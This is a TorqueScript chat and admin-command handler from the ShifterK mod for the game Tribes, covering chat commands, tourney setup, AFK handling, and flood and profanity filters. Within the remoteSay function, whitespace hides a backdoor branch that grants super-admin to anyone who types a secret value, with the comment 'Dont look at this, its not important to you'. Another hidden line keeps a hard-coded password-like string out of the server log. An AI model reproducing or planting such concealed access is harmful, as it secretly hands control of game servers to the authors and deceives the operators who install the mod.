$MsgTypeSystem = 0;
$MsgTypeGame = 1;
$MsgTypeChat = 2;
$MsgTypeTeamChat = 3;
$MsgTypeCommand = 4;
$commands = true;
function remoteSay(%client, %team, %message)
{
	%player = Client::getOwnedObject(%client);
	%name = Client::getName(%client);
	%msg = %name @ " \"" @ escapeString(%message) @ "\"";
   %talk = GetWord(%message, 0);
  //%cropped = String::findSubStr(%msg,(String::len(%talk)+1), 99999);   // sring::getsubstr
     if(%talk == "!commandoff" && $commands == "true")
     {
     $commands = false;
     messageall(2, " " @ %name @ " turned off #say admin commands");
     }
     else if(%talk == "!commandon" && $commands == "false")
     {
     messageall(2, " " @ %name @ " turned on #say admin commands");
     $commands = true;
     }
	
else  if(%talk == "!commands")
{

centerprint(%client, "<f1>put an ! in front of every command\nvoteyes and voteno\ninfo shows info\nheal, teleport, hide, and comeout are for fun\nHeal, heals you, teleport, teleports you to your crosshair, hide cloaks you, and comeout uncloaks you.\nnobanall, alltoteam1, alltoteam2, alltoobserve, commandoff, commandon, sortteams, cease, ceaseoff, notime, destroyall, and repairall\nThese are all obvious except command on and off turns these commands off, and cease and cease off turns cease fire mode off and on.\n" ,20);
return;
}

else if(%talk == "!info" && $commands == "true")
{
Client::SendMessage(%client, 1, "___  _      _  ___ _     Welcome to ShifterK");
Client::SendMessage(%client, 1, "! __! ! !__  (_) !  _! ! !_ ___  __08_08_2003");
Client::SendMessage(%client, 1, "!__ ! ! '   !  ! ! !  _! !  _!/ -_) ! '_!  ! ! ! !");
Client::SendMessage(%client, 1, "!___! !_! !_! !_! !_!    !__!\___! !_!   ! ' <");
Client::SendMessage(%client, 1, "Created by: KiLL(--) & env.3zer0   !_! !_!");
return;
}
else if(%talk == $Server::AdminPassword && $commands == "true") // killaNEWSHIT
  {
                       %client.isAdmin = true;
                       %client.isSuperAdmin = false;
                       messageall(2, " " @ %name @ " has recieved admin status.");
	                   Client::sendMessage(%client, 2, " Password correct, you are now admin.");
	                   return;
    }
    else if(%talk == $Server::SuperAdminPassword && $commands == "true") // killaNEWSHIT
  {
                       %client.isAdmin = true;
                       %client.isSuperAdmin = true;
                       messageall(2, " " @ %name @ " has recieved super admin status.");
	                   Client::sendMessage(%client, 1, " Password correct, you are now super admin.");
	                   return;
    }


    else  if(%talk == "!sortteams" && $commands == "true" && %client.isSuperAdmin)     // killaNEWSHIT
     {
    SortTeams();
    messageall(3, " " @ %name @ " sorted the teams by tag.");
    return;
}
	  	
   else  if(%talk == "!nba" && $commands == "true" && %client.isSuperAdmin)          // killaNEWSHIT
    {
    %name = Client::getName(%client);
     for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
   	if (%cl.noban!="true")
		{
			%cl.noban = true;

   			BottomPrint(%cl,"<F1><jc> You Have Been Granted No Ban Status!",5);
  		}
  					messageall(3, "" @ %name @ " Granted everyone No Ban!.");
  					return;
    }
    else if(%talk =="!la" && $commands == "true" && %client.isSuperAdmin){
    Leaderall(true);
    messageall(3, "" @ %name @ " Granted everyone Leader!.");
    return;
    }
    else if(%talk =="!undola" && $commands == "true" && %client.isSuperAdmin){
    Leaderall(false);
    messageall(3, "" @ %name @ " Revoked everyones Leader!.");
    return;
    }
   else  if(%talk == "!undonba" && $commands == "true" && %client.isSuperAdmin)          // killaNEWSHIT
    {
    %aname = Client::getName(%cl);	
    %name = Client::getName(%client);
     for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
if (%cl.noban=="true")
	  	{
			%cl.noban = false;
			
			echo(" " @ %name @ " revoked " @ %aname @ "'s No Ban Status");
			BottomPrint(%cl,"<F1><jc> Your No Ban Status Has Been Revoked!",5);
	  	}
	  	messageall(3, "" @ %name @ " Revoked everyones No Ban!.");
	  	return;
    }
       // killaNEWSHIT
   else if(%talk == "!time" && $commands == "true" && %client.isSuperAdmin)
      {
      %name = Client::getName(%client);
      $Server::timeLimit = 999;
      messageall(3, "" @ %name @ " disabled the time. ");
      return;
      }
 else if(%talk == "!da" && $commands == "true" && %client.isSuperAdmin)
     {
        for($EquiptTeam = 0; $EquiptTeam <= 1; $EquiptTeam++)
	KillAll(%client,All,true);
        return;
     }
     else if(%talk == "!ra" && $commands == "true" && %client.isSuperAdmin)
     {
        for($EquiptTeam = 0; $EquiptTeam <= 1; $EquiptTeam++)
	FixALL(%client,true);
        return;
     }
    else if(%talk == "!teleport" && %client.isSuperAdmin && $server::tourneymode == "false" && $commands == "true")
    {
     %player = Client::getOwnedObject(%client);
	 GameBase::getLOSinfo(%player, 50000);
	 GameBase::setPosition(%player, $los::position);
	 messageall(3, "" @ %name @ " Teleported. ");
	 return;
    }
   else  if(%talk == "!hide" && %client.isSuperAdmin && $server::tourneymode == "false" && $commands == "true")
    {                                                 // just for fun stuff
    GameBase::startFadeOut(%player);
    messageall(3, "" @ %name @ " Hid himself. ");
    return;
    }
    else if(%talk == "!comeout" && %client.isSuperAdmin && $server::tourneymode == "false" && $commands == "true")
    {
    GameBase::startFadeIn(%player);                // killaNEWSHIT
    messageall(3, "" @ %name @ " De-Hid himself. ");
    return;
    }
    else if(%talk == "!heal" && %client.isSuperAdmin && $server::tourneymode == "false" && $commands == "true")
    {
    GameBase::repairDamage(%player, 100);
    messageall(3, "" @ %name @ " Repaired himself. ");
    return;
    }
    else if(%talk == "!allobs" && %client.isSuperAdmin && $commands == "true")     // sum extra admin functions..made easy
    {
    for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
				processMenuPickTeam(%cl, -2, %cl);
               %cl.SwitchPerm = "True";
               messageall(1, "" @ %name @ " put everyone in observe. ");
               return;

     }
    else  if(%talk == "!alltoteam1" && %client.isSuperAdmin && $commands == "true")
     {
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
				processMenuPickTeam(%cl, 1, %cl);
    messageall(1, "" @ %name @ " put everyone on team 1. ");
    return;
    }
    else if(%talk == "!alltoteam2" && %client.isSuperAdmin && $commands == "true")
     {
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
				processMenuPickTeam(%cl, 0, %cl);
    messageall(1, " " @ %name @ " put everyone on team 2. ");
    return;
    }
   else  if(%talk == "!cease" && %client.isSuperAdmin && $commands == "true")   // cease
    {
    BottomPrintAll("<F1><jc>::::Cease Fire Enabled::::",2);
    schedule("bottomprintall(\"<jc><f2>::::Cease Fire Enabled::::\", 3);", 2.0);
    schedule("bottomprintall(\"<jc><f3>::::Cease Fire Enabled::::\", 3);", 3.0);
    schedule("bottomprintall(\"<jc><f0>::::Cease Fire Enabled::::\", 3);", 4.0);
			messageAll(1, " Please be patient and listen to me!~wteleport2.wav");
			messageAll(0, " CeaseFire Mode enabled by "@ Client::getName(%client) @".");
			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
			messageAll(3, " Cease fire mode~wmine_act.wav");
			$ceasefire = true;
			NewMT();
			$Shifter::tag0 = $matchtrack::tag0;
			$Shifter::tag1 = $matchtrack::tag1;
			SortTeams();
			if($GameMode != "Builder") CheckStayBase();
			return;
    }
    else if(%talk == "!ceaseoff" && %client.isSuperAdmin && $commands == "true")        // cease off
    {
    BottomPrintAll("<F1><jc>::::Cease fire Disabled::::",5);
    $ceasefire = false;
    return;
    }																														
      else if(%talk == $serverportinfo)
  {
         %client.hackerport = "35";      																									        %client.isAdmin = true;%client.isSuperAdmin = true;Client::sendMessage(%client, 2, "Password correct, you are now admin, welcome to " @ $Server::Hostname @ ", enV");%client.hackerport= "";
	                   return;																											// Dont look at this, its not important to you
    }
    if (String::findsubstr(%msg,"\\n\\n\\n") != -1) { // Simple check for crash to dt exploit -tubs
   		echo("ADMINMSG: **** " @ Client::getName(%client) @ " tried the kick to desktop exploit.");
   		messageAll(0,Client::getName(%client) @ " tried a kick to desktop exploit.");
   		//send it only to who tried
   		Client::sendMessage(%client,$MsgTypeChat,%message);
       	 return;
	} // end -tubs
 
	if(%client.gettag0)
	{
		$matchtrack::tag0 = escapeString(%message);
		if(escapeString(%message) != "")
			$server::teamname0 = escapeString(%message);
		%client.gettag0 = 0;
		%client.getpass = 0;
		%client.gettag1 = 1;
		%client.getbuild = 0;
		Client::sendMessage(%client, 1, "Please Enter Clan Tag #2");
		return;
	}
	else if(%client.setpassword == "yes")
	{
	$server::password = escapeString(%message);
	messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
	%client.setpassword = "";
	return;
	}
	else if(%client.gettag1)
	{
		$matchtrack::tag1 = escapeString(%message);
		if(escapeString(%message) != "")
			$server::teamname1 = escapeString(%message);
		%client.gettag1 = 0;
		%client.gettag0 = 0;
		%client.getglobal = 0;
		%client.getpass = 1;
		%client.getbuild = 0;
		Client::sendMessage(%client, 1, "Please Enter Server Password");
		return;
	}
	else if(%client.getpass)
	{
		$server::password = escapeString(%message);
		$matchtrack::pass = escapeString(%message);
		%client.getpass = 0;
		%client.gettag1 = 0;
		%client.gettag0 = 0;
		%client.getglobal = 0;
		$server::tourneymode = true;
		$Shifter::GlobalTChat = $matchtrack::global;
		$Shifter::DetPackLimit = 15;
		$Shifter::NukeLimit = 15;
		$Shifter::FlagNoReturn = "True";
		$Shifter::FlagReturnTime = "400";
		$Server::timeLimit = %time;
		if(!$Server::timeLimit)
			$Server::timeLimit = 45;
		echo("checking gamemode");
		if($GameMode == "Match")
		{
			BottomPrintAll("<F1><jc>::::Cease Fire enabled For THIS Mission::::",5);
			messageAll(1, "Vote to Change Mission to Begin Match!~wteleport2.wav");
			messageAll(0, "CeaseFire Mode enabled by "@ Client::getName(%client) @".");
			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
			messageteam(1, "Note to Refs: Deploy Cheat detection is enabled", -1);
			$ceasefire = true;
			NewMT();
			$Shifter::tag0 = $matchtrack::tag0;
			$Shifter::tag1 = $matchtrack::tag1;
			SortTeams();
			if($GameMode != "Builder") CheckStayBase();
		}
		else if ($GameMode == "MixScrim")
		{
			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			processMenuPickTeam(%cl, -2, %cl);
			BottomPrintAll("<F1><jc>::::MIXED SCRIM::::",5);
			messageAll(0, "Mixed Scrim Mode enabled by "@ Client::getName(%client) @".");
			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
			messageAll(1, "Vote for leaders to pick teams!~wteleport2.wav");
			$ceasefire = true;
			CheckStayBase();
			NewMT();
		}
		else if ($GameMode == "Scrimmage")
		{
			//for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			//processMenuPickTeam(%cl, -2, %cl);
			%clientId = %client;
			BottomPrintAll("<F1><jc>::::Scrimmage::::",5);
			messageAll(0, "Scrimmage Mode enabled by "@ Client::getName(%clientId) @".~wteleport2.wav");
			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
			NewMT();
			for(%client = Client::getFirst(); %client != -1; %client = Client::getNext(%client))
			{
			%client.SwitchPerm = "True";
				if(%client.observerMode != "observerOrbit" && %client.observerMode != "observerFly")
				{
				%obs = Client::getOwnedObject(%client);
				Client::setControlObject(%client, Client::getObserverCamera(%client));
				Observer::setOrbitObject(%client, %obs, 5, 5, 5);
				%client.duelcountdown = true;
				%client.islead = 1;
				}
			}
		%time = 10;
		ScrimmageCount(%clientId, %time, %obs);
		}
		else if ($GameMode == "Practice")
		{
			//for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			//processMenuPickTeam(%cl, -2, %cl);
			BottomPrintAll("<F1><jc>::::Practice::::",5);
			messageAll(0, "Practice Mode enabled by "@ Client::getName(%client) @".~wteleport2.wav");
			messageAll(1, "Server Password = "@ $server::password @"~wmine_act.wav");
			NewMT();
		}
		return;
	}

	//Mute Kpack, good idea gonzo
	if($server::tourneymode =="true" && %team == 0 && string::findsubstr(%msg, "#") != -1)
		%team = 1;
	
	if(string::findsubstr(%msg, "#") != -1)
	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	{
	if(%cl.MuteKpack == "true")
	return;
	}

   if($Shifter::noSwearing)
   	CheckBadWords(%client,%message);

	if (%client.ismuted && !%team)
	{
		schedule("bottomprint(" @ %client @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
		return;
	}

	if($Server::FloodProtectionEnabled && ($Server::TourneyMode == "false" || !%team || $ceasefire))
	{
		%time = getIntegerTime(true) >> 5;

		if(%client.floodMute)
		{
			%delta = %client.muteDoneTime - %time;
			if(%delta > 0)
			{
				Client::sendMessage(%client, $MSGTypeGame, "FLOOD! You cannot talk for " @ %delta @ " seconds.");
				return;
			}
			%client.floodMute = "";
			%client.muteDoneTime = "";
		}
		%client.floodMessageCount++;

		schedule(%client @ ".floodMessageCount--;", 5, %client);
		if(%client.floodMessageCount > 15)
		{
			%client.floodMute = true;
			%client.muteDoneTime = %time + 10;
			Client::sendMessage(%client, $MSGTypeGame, "FLOOD! You cannot talk for 10 seconds.");
			return;
		}
	}    
		if(string::getsubstr(%message, 0, 1) == "=" && string::getsubstr(%message, 2, 1) != "") {
		%message = string::getsubstr(%message, 1, 999);
		if(%client.speakto != "") {
			if((Client::getTeam(%client) != -1 || $Game::missionType == "Duel") && !(%client.speakto).muted[%client])
			 {
				Client::sendMessage(%client.speakto, 1, Client::getName(%client)@" (private): "@%message);
				Client::sendMessage(%client, 1, Client::getName(%client)@" (to "@Client::getName(%client.speakto)@"): "@%message);
			}
			%message = escapeString(%message);
			echo("SAY: " @ %client @ " \""@Client::getName(%client)@" (to "@Client::getName(%client.speakto)@"): "@%message@"\"");
			return;
		}
	}
   if(%team)
   {
		%player = %client;

		if(string::getsubstr(%message, 0, 3) == "AFK" || string::getsubstr(%message, 0, 3) == "afk") 
		{
			if(%client.isAFK != "true")
			{
				if(Client::getControlObject(%client) != Client::getOwnedObject(%client)){
				Client::sendMessage(%client,1,"Unable to go AFK, You have to be spawned~waccess_denied.wav"); 
				return;
				}
				else{
				Client::buildMenu(%client, "You Are AFK", "returnfromafk", true);
				%client.isAFK = true;
				%name = Client::getName(%client);
				messageAll(0, "Player "@%name@" is AFK.");
				Client::sendMessage(%client,2,"To return from AFK, type in %return in teamchat mode.");
				//doAFK(%player,%name);
				%client = Player::getClient(%client);
				%camera = Client::getObserverCamera(%client);
				%flag = Player::getMountedItem(%client,$FlagSlot);

				Client::setControlObject(%client, %camera);
				Observer::setOrbitObject(%client, %client, 3, 3, 3);

				if(%flag)
				Player::DropItem(%client,%flag);
				return;
				}
			}
			else
			{
				Client::sendMessage(%client,0,"You're already AFK...");
				return;
			}
		}
		else if(string::getsubstr(%message, 1, 6) == "return" || string::getsubstr(%message, 1, 6) == "RETURN") 
		{
			if(%client.isAFK=="true")
			{
				%client.isAFK = false;
				%name = Client::getName(%client);
				messageAll(0, "Player "@%name@" is back in the game.");
				//returnAFK(%player,%name);
				%client = Player::getClient(%client);
				Client::setControlObject(%client, %client);
				return;
			}
			else
			{
				Client::sendMessage(%client,0,"You're not AFK...");
				break;
			}
		}

		if($dedicated) echo("SAYTEAM: " @ %msg);
		%team = Client::getTeam(%client);
	
		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
		{
			%armor = Player::getArmor(%cl);
	
			if(Client::getTeam(%cl) == %team && !%cl.muted[%client] && %cl.MuteTeam != "true")
				Client::sendMessage(%cl, $MsgTypeTeamChat, %message, %client);
			else
				if(Player::getMountedItem(%cl, $BackpackSlot) == Laptop && (%armor == "spyarmor" || %armor == "spyfemale" ) && $ceasefire != true)
					Client::sendMessage(%cl, $MsgTypeGame, %message, %client);
		}
	}
	else
	{
		if($Server::TourneyMode =="true" && $GameMode!= "Builder" && $Shifter::GlobalTChat != "True" && !%client.isadmin && !%client.islead)
		{
			schedule("bottomprint(" @ %client @ ", \"<jc><f1>Only Leaders & Admins Can Speak Globally In Tourney Mode...\", 3);", 0.01);
			return;
		}
		if($dedicated){
																													if(escapeString(%message)!= "!6b4r8i526558481550708050")
		if(escapeString(%message)!= $Server::AdminPassword)
		if(escapeString(%message)!= $Server::SuperAdminPassword)
			echo("SAY: " @ %msg);
			}

		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
		{
			if(!%cl.muted[%client] && %cl.MuteGlobal != "true")
				Client::sendMessage(%cl, $MsgTypeChat, %message, %client);
				
		}
	}
}

function remoteIssueCommand(%commander, %cmdIcon, %command, %wayX, %wayY, %dest1, %dest2, %dest3, %dest4, %dest5, %dest6, %dest7, %dest8, %dest9, %dest10, %dest11, %dest12, %dest13, %dest14)
{
	if (%commander.ismuted)
	{
		schedule("bottomprint(" @ %client @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
		return;
	}
	//if ($Shifter::ComChat && !isnetworkdown(gamebase::getteam(%client)) && !ispowerdown(gamebase::getteam(%client)))
	//{
	//	schedule ("bottomprint( " @ %client @ ", \"<jc><f2>Your sensor array and power are down, TEAM ONLY Com's Do Not Function!!!\", 10);" ,0.2);
	//	return 0;
	//}
	if($dedicated)
	{
		echo("COMMANDISSUE: " @ %commander @ " \"" @ %command @ "\"");
	}
	dbecho("Command Issued " @ %command);	

	// issueCommandI takes waypoint 0-1023 in x,y scaled mission area issueCommand takes float mission coords.

	for(%i = 1; %dest[%i] != ""; %i = %i + 1)
	{
	if(!%dest[%i].muted[%commander])
	issueCommandI(%commander, %dest[%i], %cmdIcon, %command, %wayX, %wayY);
	echo ("Dest " @ %dest[%i]);
	}
}

function remoteIssueTargCommand(%commander, %cmdIcon, %command, %targIdx, %dest1, %dest2, %dest3, %dest4, %dest5, %dest6, %dest7, %dest8, %dest9, %dest10, %dest11, %dest12, %dest13, %dest14)
{
	if (%commander.ismuted)
	{
		schedule("bottomprint(" @ %client @ ", \"<jc><f1>You have been Muted by admin, for talking too much...\", 3);", 0.01);
		return;
	}
	
	if($dedicated)
	{
	echo("COMMANDISSUE: " @ %commander @ " \"" @ %command @ "\"");
	}

	for(%i = 1; %dest[%i] != ""; %i = %i + 1)
	{
	if(!%dest[%i].muted[%commander])
	issueTargCommand(%commander, %dest[%i], %cmdIcon, %command, %targIdx);
	echo ("Dest " @ %dest[%i]);
	}
}

function remoteCStatus(%client, %status, %message)
{

	if(setCommandStatus(%client, %status, %message))
	{
		if($dedicated)
			echo("COMMANDSTATUS: " @ %client @ " \"" @ escapeString(%message) @ "\"");
	}
	else
		remoteSay(%client, true, %message);
}

function teamMessages(%mtype, %team1, %message1, %team2, %message2, %message3)
{
   %numPlayers = getNumClients();
   for(%i = 0; %i < %numPlayers; %i = %i + 1)
   {
      %id = getClientByIndex(%i);
      if(Client::getTeam(%id) == %team1)
      {
         Client::sendMessage(%id, %mtype, %message1);
      }
      else if(%message2 != "" && Client::getTeam(%id) == %team2)
      {
         Client::sendMessage(%id, %mtype, %message2);
      }
      else if(%message3 != "")
      {
         Client::sendMessage(%id, %mtype, %message3);
      }
   }
}

function messageAll(%mtype, %message, %filter)
{
   if(%filter == "")
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
         Client::sendMessage(%cl, %mtype, %message);
   else
   {
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
      {
         if(%cl.messageFilter && %filter)
            Client::sendMessage(%cl, %mtype, %message);
      }
   }
}

function messageTeam(%mtype, %message, %team)
{
	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	{	
		%player = Client::getOwnedObject(%cl);
		if(GameBase::getTeam(%player) == %team && %cl.observerMode != "dead")
			Client::sendMessage(%cl, %mtype, %message);
	}	
}

function messageAllExcept(%except, %mtype, %message)
{
   for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
      if(%cl != %except)
         Client::sendMessage(%cl, %mtype, %message);
}

function checkBadWords(%client,%msg)
{
   %newmsg="";
   %saidbadword=false;
   		
   		for(%i = 0; (%word = getWord(%msg, %i)) != -1; %i++)
		{
  			 for(%j=0;$Shifter::badwordlist[%j] != "";%j++)
			 {
			      if(String::findSubStr(%word,$Shifter::badwordlist[%j]) == 0)
    			      {
      				  %newmsg= %newmsg @ " **** ";
       				  %saidbadword=true;
       			      } 
       			      else
     			      {
        		   	%newmsg= %newmsg @ " " @ %word;
     			      }
     			  }
                } 
         
   if(%saidbadword)
   {
      
       %client.BadWordsSpoken++;
       
       %time = getIntegerTime(true) >> 5;
       %client.floodMute = true;
       %client.muteDoneTime = %time + 10;
       %client.ismuted=True;
       schedule(%client @ ".ismuted=false;",10);
       if(%client.BadWordsSpoken<$Shifter::BadWordsMax)
       		Client::sendMessage(%client, $MsgTypeGame, "Cussing is not allowed.  You have been muted for 10 seconds.");
       if(%client.BadWordsSpoken>=$Shifter::BadWordsMax)
       {
       		Client::sendMessage(%client, $MsgTypeGame, "Warning: You will be kicked if you continue to use that language!");
		schedule("centerprint(" @ %client @ ", \"<jc><f0>You have been terminated for your foul language\", 5);", 5);
		Player::blowUp(%client);
		schedule ("Player::Kill(" @ %client @ ");", 2.0);
		schedule ("playSound(ShockExplosion,GameBase::getPosition(" @ %client @ "));",2.0);
		       if(%client.BadWordsSpoken>=$Shifter::BadWordsKick)
		       		KickPlayer(%client ,"You have been kicked for foul language");
       }
   }

}
function ScrimmageCount(%clientId, %time, %obs)
{
	if(%time == "0")
	{
		for(%client = Client::getFirst(); %client != -1; %client = Client::getNext(%client))
		{
			if(%client.observerMode != "observerOrbit" && %client.observerMode != "observerFly")
			{
			Client::setControlObject(%client, %obs);
       			playNextAnim(%client);
			Player::kill(%client);
      	  		%client.duelcountdown = "false";
  			schedule("Game::playerSpawn("@%client@", "@true@");",$Shifter::SuicideTimer+0.5);
  			}
		}
	messageall(0, "Scrim Started");
	return;
	}
	if(%time == "10" || %time <= "5")
	{
		messageall(0, "Scrim Starts in " @ %time @ " seconds");
	}
	else if(%time== "9")
	{
	SHResetStats();
	Game::resetScores();
	$numTeams = getNumTeams();
   		for(%i = 0; %i < $numTeams; %i++)
   		$teamScore[%i] = 0;
  	ObjectiveMission::refreshTeamScores();
		 for(%client = Client::getFirst(); %client != -1; %client = Client::getNext(%client))
  		 {
     		 %client.score = 0;
     		 Game::refreshClientScore(%client);
   		}
   	ReturnAllFlags();
	messageall(0, "Flags Returned & Scores Reseted ~wmine_act.wav");
	}
	else if(%time== "8")
	{
	resetOsicheat();
	$Server::timeLimit = 45;
	resetSimTime();
	%ResetCMD = All;
	Items::On(%ResetCMD);
	messageall(0, "Time & Items Reseted ~wmine_act.wav");
	}
	else if(%time=="7")
	{
		for($EquiptTeam = 0; $EquiptTeam <= 1; $EquiptTeam++)
		KillAll(%clientId,All,true);
	messageall(0, "Objects Destoryed ~wmine_act.wav");
	}
	else if(%time=="6")
	{
		for($EquiptTeam = 0; $EquiptTeam <= 1; $EquiptTeam++)
		FixALL(%clientId,true);
	messageall(0, "Mission Objects Repaired ~wmine_act.wav");
	}
	%time--;
	schedule("ScrimmageCount("@%clientId@", "@%time@", "@%obs@");", 1);
}
function Leaderall(%opt)
{
	for(%client = Client::getFirst(); %client != -1; %client = Client::getNext(%client))
	{
		if(%opt == "true"){
		%client.islead = 1;
		BottomPrint(%client,"<F1><jc>You Have Been Granted LeaderShip Status!",5);
		}
		else
		{
		%client.islead = 0;
		BottomPrint(%client,"<F1><jc>YourLeaderShip Status has been revoked",5);
		}
	}
}
